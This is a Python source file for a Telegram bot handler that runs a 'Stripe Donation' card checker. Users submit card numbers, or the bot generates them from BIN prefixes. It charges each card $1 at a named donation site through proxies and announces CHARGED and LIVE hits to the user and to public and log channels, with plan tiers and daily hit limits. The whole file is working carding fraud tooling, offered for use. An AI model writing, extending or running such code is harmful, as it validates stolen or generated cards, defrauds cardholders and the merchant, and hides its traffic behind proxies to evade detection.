import time
import re
import asyncio
import random
from aiogram import Router, Bot, F
from aiogram.types import (
    Message, CallbackQuery, LinkPreviewOptions,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.filters import Command
from aiogram.enums import ParseMode

NO_PREVIEW = LinkPreviewOptions(is_disabled=True)

_stop_flags: dict = {}
_pending_bin_checks: dict = {}

import database.db as db
from functions.bin_lookup import lookup_bin
from functions.card_utils import parse_card, parse_cards
from functions.stripe_donation import check_donation_card
from functions.emojis import EMOJI
from config import OWNER_IDS, BOT_NAME, BOT_USERNAME, FREE_DAILY_LIMIT, LOG_CHANNEL_ID

router = Router()

from functions.proxy_utils import pick_proxy


def status_emoji(status: str) -> str:
    return {
        "CHARGED": EMOJI["charged"],
        "DECLINED": EMOJI["declined"],
        "3DS": EMOJI["3ds"],
        "ERROR": EMOJI["error"],
        "FAILED": EMOJI["error"],
        "EXPIRED": EMOJI["expired"],
    }.get(status, EMOJI["question"])


async def _notify_user_hit(bot: Bot, result: dict, uid: int, time_taken: float):
    card_str = result["card"]
    bin6 = card_str[:6]
    bin_info = await lookup_bin(bin6)
    
    status_label = "CHARGED ✅" if result["status"] == "CHARGED" else "LIVE 🔥"
    country_display = f"{bin_info['flag']} {bin_info['country_name']}" if bin_info['country_code'] else bin_info['country_name']
    
    text = (
        f"<blockquote>🎯 <b>Hit Found! (Stripe $1 Donation)</b> 🎯 ❞</blockquote>\n\n"
        f"<blockquote>💳 <b>[•] Card</b> → <code>{card_str}</code> ❞\n"
        f"🟢 <b>[•] Status</b> → <b>{status_label}</b>\n"
        f"💬 <b>[•] Response</b> → <code>{result.get('response')}</code></blockquote>\n\n"
        f"<blockquote>🏪 <b>[•] Merchant</b> → <code>Stripe Donation ($1)</code> ❞\n"
        f"💰 <b>[•] Amount</b> → <code>$1.00 USD</code></blockquote>\n\n"
        f"<blockquote>🏛️ <b>[•] Bank</b> → <code>{bin_info['bank']}</code> ❞\n"
        f"💳 <b>[•] Type</b> → <code>{bin_info['brand']} / {bin_info['type']} ({bin_info['category']})</code>\n"
        f"🌍 <b>[•] Country</b> → <code>{country_display}</code></blockquote>\n\n"
        f"<blockquote>⏱️ <b>Time Taken</b> → <code>{time_taken}s</code> ❞</blockquote>"
    )
    try:
        await bot.send_message(uid, text, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def _notify_channels(bot: Bot, result: dict, uid: int, username: str):
    """Notify configured log channel and public channel of charged hits."""
    card_str = result["card"]
    cc = card_str.split("|")[0]
    masked_card = cc[:6] + "x" * (len(cc) - 10) + cc[-4:]
    
    # Get user role label
    is_owner = uid in OWNER_IDS or await db.is_db_owner(uid)
    is_admin = await db.is_admin(uid)
    plan = await db.get_user_plan(uid)
    
    if is_owner:
        plan_label = "OWNER"
    elif is_admin:
        plan_label = "ADMIN"
    elif plan["unlimited"]:
        plan_label = "PREMIUM"
    else:
        plan_label = "FREE"

    text = (
        f"⭐ <b>LIVE HIT DETECTED!</b>\n"
        f"➡ Gateway: <code>Stripe Donation</code>\n"
        f"➡ Amount: <code>$1.00 USD</code>\n"
        f"➡ Card: <code>{masked_card}</code>\n"
        f"➡ User: {username}\n"
        f"➡️ Plan: <code>{plan_label}</code>\n"
        f"💋 Checked with {BOT_USERNAME}\n"
        f"made by @damxd89"
    )

    # 1. Send to public channel if configured in DB settings
    public_ch = await db.get_setting("public_channel", "")
    if public_ch:
        try:
            target = int(public_ch) if public_ch.lstrip("-").isdigit() else public_ch
            await bot.send_message(target, text, parse_mode=ParseMode.HTML, link_preview_options=NO_PREVIEW)
        except Exception:
            pass

    # 2. Send to LOG_CHANNEL_ID if configured in config.py
    if LOG_CHANNEL_ID:
        try:
            target = int(LOG_CHANNEL_ID) if LOG_CHANNEL_ID.lstrip("-").isdigit() else LOG_CHANNEL_ID
            await bot.send_message(target, text, parse_mode=ParseMode.HTML, link_preview_options=NO_PREVIEW)
        except Exception:
            pass


# Stop callback for check process
@router.callback_query(F.data.startswith("chk_stop_"))
async def cb_stop_check(query: CallbackQuery):
    try:
        target_uid = int(query.data.split("_", 2)[2])
    except (IndexError, ValueError):
        return
    if query.from_user.id != target_uid:
        return await query.answer("Not your session.", show_alert=True)
    _stop_flags[target_uid] = True
    await query.answer("Stopping...")


# Saved BIN selection callbacks for `/check`
@router.callback_query(F.data.startswith("chksbin_cancel_"))
async def cb_sbin_cancel(query: CallbackQuery):
    try:
        target_uid = int(query.data.split("_", 2)[2])
    except (IndexError, ValueError):
        return
    if query.from_user.id != target_uid:
        return await query.answer("Not your session.", show_alert=True)
    _pending_bin_checks.pop(target_uid, None)
    await query.message.delete()
    await query.answer("Cancelled.")


@router.callback_query(F.data.startswith("chksbin_"))
async def cb_sbin_select(query: CallbackQuery, bot: Bot):
    parts = query.data.split("_", 2)
    if len(parts) < 3:
        return
    try:
        target_uid = int(parts[1])
    except ValueError:
        return
    bin_name = parts[2]
    if query.from_user.id != target_uid:
        return await query.answer("Not your session.", show_alert=True)
    data = _pending_bin_checks.pop(target_uid, None)
    if not data:
        return await query.answer("Session expired.", show_alert=True)
    await query.answer()

    saved_bins = await db.get_saved_bins(target_uid)
    bin_value = None
    for b in saved_bins:
        if b["name"] == bin_name:
            bin_value = b["bin_value"]
            break
    if not bin_value:
        await query.message.edit_text(f"{EMOJI['declined']} BIN not found.", parse_mode=ParseMode.HTML)
        return

    from functions.card_utils import parse_gen_input, generate_cards, parse_cards as _pc
    prefix, month, year, cvv, count = parse_gen_input(bin_value)
    # Default to 1 for check, or use count if specified
    gen_count = 1 if data["is_single"] else min(count, 20)
    gen_cards = generate_cards(prefix, month, year, cvv, gen_count)
    cards = _pc("\n".join(gen_cards))
    if not cards:
        await query.message.edit_text(f"{EMOJI['declined']} Failed to generate.", parse_mode=ParseMode.HTML)
        return

    msg = data["msg"]
    uid = target_uid
    if await db.is_banned(uid):
        return
    plan = await db.get_user_plan(uid)
    is_privileged = uid in OWNER_IDS or await db.is_db_owner(uid) or await db.is_admin(uid)
    if not is_privileged:
        can, reason = await db.can_hit(uid)
        if not can:
            await msg.answer(f"{EMOJI['error']} {reason}", parse_mode=ParseMode.HTML)
            return

    proxy = await pick_proxy(user_id=uid)
    _stop_flags[uid] = False
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Stop", callback_data=f"chk_stop_{uid}")]])

    status_msg = await msg.answer("Initializing Stripe Donation check...", parse_mode=ParseMode.HTML, reply_markup=stop_kb)
    await _run_check_process(msg=msg, bot=bot, uid=uid, cards=cards, proxy=proxy, status_msg=status_msg)


async def _run_check_process(msg, bot, uid, cards, proxy, status_msg):
    total = len(cards)
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Stop", callback_data=f"chk_stop_{uid}")]])
    no_kb = InlineKeyboardMarkup(inline_keyboard=[])

    _stop_flags[uid] = False
    results = []
    card_blocks = []
    last_edit = time.perf_counter()

    for i, card in enumerate(cards):
        if _stop_flags.get(uid):
            break

        cc_full = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"

        now_ts = time.perf_counter()
        if (now_ts - last_edit) >= 1.0 or i == 0:
            checking_text = (
                f"<blockquote>⚡ <b>Stripe Donation Checker</b> ⚡ ❞</blockquote>\n\n"
                f"<blockquote>🌀 <b>Status:</b> Checking card <code>{i+1}/{total}</code>... ❞</blockquote>"
            )
            try:
                await status_msg.edit_text(checking_text, parse_mode=ParseMode.HTML, reply_markup=stop_kb)
                last_edit = time.perf_counter()
            except Exception:
                pass

        try:
            result = await asyncio.wait_for(check_donation_card(card, proxy), timeout=45)
        except asyncio.TimeoutError:
            result = {"card": cc_full, "status": "FAILED", "response": "Timeout", "decline_code": "", "time": 45.0}
        except Exception as e:
            result = {"card": cc_full, "status": "FAILED", "response": str(e)[:50], "decline_code": "", "time": 0.0}
        results.append(result)

        is_charged = result["status"] == "CHARGED"
        is_live = result["status"] == "DECLINED" and result.get("decline_code") == "incorrect_cvc"

        if is_charged:
            await db.log_check(
                user_id=uid,
                card=result["card"],
                url="https://www.forechrist.com",
                merchant="Stripe Donation",
                amount="$1.00 USD",
                status="CHARGED",
                response=result["response"],
                time_taken=result["time"]
            )
            if uid not in OWNER_IDS:
                await db.increment_daily_hits(uid)

        # Notify channels & user on Charged hit
        if is_charged or is_live:
            username_to_pass = f"@{msg.from_user.username}" if msg.from_user.username else msg.from_user.first_name
            await _notify_channels(bot, result, uid, username_to_pass)
            await _notify_user_hit(bot, result, uid, result["time"])

        resp = result.get("response", "Declined")
        if is_charged:
            s = f"CHARGED {EMOJI['charged']}"
        elif is_live:
            s = f"LIVE {EMOJI['live']}"
        elif result["status"] == "DECLINED":
            s = f"DECLINED {EMOJI['declined']}"
        elif result["status"] == "3DS":
            s = f"3DS {EMOJI['3ds']}"
        else:
            s = result["status"]

        block = (
            f"<blockquote>💳 <code>{result['card']}</code> ❞\n"
            f"↳ <b>Result:</b> {s}\n"
            f"↳ <b>Response:</b> <code>{resp}</code> | <b>Time:</b> <code>{result['time']}s</code></blockquote>"
        )
        card_blocks.append(block)

        now = time.perf_counter()
        is_last = (i == total - 1)
        if is_last or (now - last_edit) >= 1.5:
            last_edit = now
            label = "COMPLETE" if is_last else "Processing..."
            total_elapsed = round(sum(r["time"] for r in results), 2)
            summary = (
                f"<blockquote>⚡ <b>Stripe Donation Checker</b> ⚡ ❞</blockquote>\n\n"
            )
            visible = card_blocks[-10:]
            body = summary + "\n\n".join(visible) + f"\n\n<blockquote>⏱️ <b>Total Time:</b> <code>{total_elapsed}s</code> ❞</blockquote>"
            if len(body) > 4000:
                body = body[:3990] + "..."
            try:
                await status_msg.edit_text(body, parse_mode=ParseMode.HTML, reply_markup=no_kb if is_last else stop_kb)
            except Exception:
                pass

        if is_charged and total == 1:
            break

    _stop_flags.pop(uid, None)


async def _handle_check_command(msg: Message, bot: Bot, is_single: bool):
    uid = msg.from_user.id
    
    # Check gateway status
    gw_status = await db.get_setting("gateway_chk_status", "off")
    is_owner = uid in OWNER_IDS or await db.is_db_owner(uid)
    if gw_status == "off" and not is_owner:
        await msg.answer(f"{EMOJI['error']} <b>Donation Checker is currently turned ON FOR OWNER ONLY</b>", parse_mode=ParseMode.HTML)
        return

    await db.upsert_user(uid, msg.from_user.username, msg.from_user.first_name)
    if await db.is_banned(uid):
        return

    text = msg.text or ""
    # Strip command prefix
    remaining = re.sub(r"^[./](check|chk|mash)\s*", "", text, flags=re.IGNORECASE).strip()
    cards = parse_cards(remaining)

    # Auto generation logic if prefix/BIN is provided
    if not cards and remaining.strip():
        from functions.card_utils import parse_gen_input, generate_cards
        parts = remaining.strip().split()
        bin_str = parts[0] if parts else ""
        default_count = 1 if is_single else 10
        gen_count = min(int(parts[1]), 25) if len(parts) >= 2 and parts[1].isdigit() else default_count
        bin_clean = bin_str.split("|")[0]
        if len(bin_clean) >= 6 and bin_clean.replace("x", "").replace("X", "").isdigit():
            prefix, month, year, cvv, _ = parse_gen_input(bin_str)
            gen_cards = generate_cards(prefix, month, year, cvv, gen_count)
            cards = parse_cards("\n".join(gen_cards))

    # Read from document or reply message if no cards directly provided
    if not cards and msg.reply_to_message:
        reply = msg.reply_to_message
        if reply.document and reply.document.file_name and reply.document.file_name.endswith(".txt"):
            try:
                file = await bot.get_file(reply.document.file_id)
                content = await bot.download_file(file.file_path)
                cards = parse_cards(content.read().decode("utf-8", errors="ignore"))
            except Exception:
                pass
        elif reply.text:
            reply_card_text = reply.text.strip()
            if reply_card_text:
                cards = parse_cards(reply_card_text)

    # Saved BIN prompt if still no cards
    if not cards:
        saved_bins = await db.get_saved_bins(uid)
        if saved_bins:
            buttons = [[InlineKeyboardButton(text=f"{b['name']}", callback_data=f"chksbin_{uid}_{b['name']}")] for b in saved_bins[:10]]
            buttons.append([InlineKeyboardButton(text="Cancel", callback_data=f"chksbin_cancel_{uid}")])
            _pending_bin_checks[uid] = {"msg": msg, "is_single": is_single}
            await msg.answer("No cards provided. Choose a saved BIN to check:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode=ParseMode.HTML)
            return
        else:
            await msg.answer(f"No valid cards or saved BINs. Format: <code>/check cc|mm|yy|cvv</code>", parse_mode=ParseMode.HTML)
            return

    # Enforce check limits
    plan = await db.get_user_plan(uid)
    is_privileged = uid in OWNER_IDS or await db.is_db_owner(uid) or await db.is_admin(uid)
    if not is_privileged:
        can, reason = await db.can_hit(uid)
        if not can:
            await msg.answer(f"{EMOJI['error']} {reason}", parse_mode=ParseMode.HTML)
            return

    # Cap count for free/premium users
    if is_single:
        cards = cards[:1]
    else:
        # Bulk check caps at 15 for Free and 30 for Premium (privileged users get 30)
        limit = 30 if (plan["unlimited"] or is_privileged) else 15
        cards = cards[:limit]

    if not plan["unlimited"] and not is_privileged:
        hits_so_far = await db.get_daily_hits(uid)
        remaining_hits = max(0, FREE_DAILY_LIMIT - hits_so_far)
        if remaining_hits == 0:
            await msg.answer(f"{EMOJI['error']} Daily limit reached.", parse_mode=ParseMode.HTML)
            return
        cards = cards[:remaining_hits]

    proxy = await pick_proxy(user_id=uid)
    _stop_flags[uid] = False
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Stop", callback_data=f"chk_stop_{uid}")]])

    status_msg = await msg.answer("Initializing Stripe Donation check...", parse_mode=ParseMode.HTML, reply_markup=stop_kb)
    await _run_check_process(msg=msg, bot=bot, uid=uid, cards=cards, proxy=proxy, status_msg=status_msg)


@router.message(Command("check", "chk", prefix="/."))
async def cmd_check(msg: Message, bot: Bot):
    await _handle_check_command(msg, bot, is_single=True)


@router.message(Command("mash", prefix="/."))
async def cmd_mash(msg: Message, bot: Bot):
    await _handle_check_command(msg, bot, is_single=False)
